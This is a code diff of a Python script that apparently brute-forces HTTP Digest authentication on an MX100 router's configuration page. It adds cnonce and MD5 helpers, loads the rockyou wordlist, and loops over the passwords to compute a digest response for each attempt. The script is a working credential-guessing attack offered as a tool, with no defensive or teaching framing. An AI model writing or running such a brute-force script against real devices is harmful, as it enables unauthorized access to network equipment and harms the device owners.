@@ -3,6 +3,18 @@ import hash
 # no need for this anymore :D
 # from requests.auth import HTTPDigestAuth
 
+
+def new_cnonce():
+    # I don't think I've written something as convoluted as this monstrosity
+    return hex(random.randint(0, int('ffffffffffffffff', 16)))[2:]
+
+
+# proud of this one
+def md5(*args):
+    string = ':'.join(str(x) for x in args)
+    return(hashlib.md5(string.encode()).hexdigest())
+
+
 # different ways to get to the config page of the MX100
 testurl = 'https://www.google.com'
 url1 = 'http://172.16.1.1/configure'
@@ -24,7 +36,7 @@ nonce = r.headers['WWW-Authenticate'][180:-13]
 # print(nonce)
 
 # fresh off the stack overflow griddle
-with open('rockyou.txt', encoding='ansi') as file:
+with open('rockyou_utf8.txt') as file:
     # tf is list comprehension?
     passwords = [line.rstrip() for line in file]
 print('List loaded')
@@ -33,7 +45,6 @@ total = 170000
 
 # make a request with each password, starting at the last one logged
 for i in range(total+1, len(passwords)):
-    # too easy
     cnonce = hash.new_cnonce()
     h1 = hash.md5(user, realm, passwords[i])
     h2 = hash.md5('HEAD', '/configure')
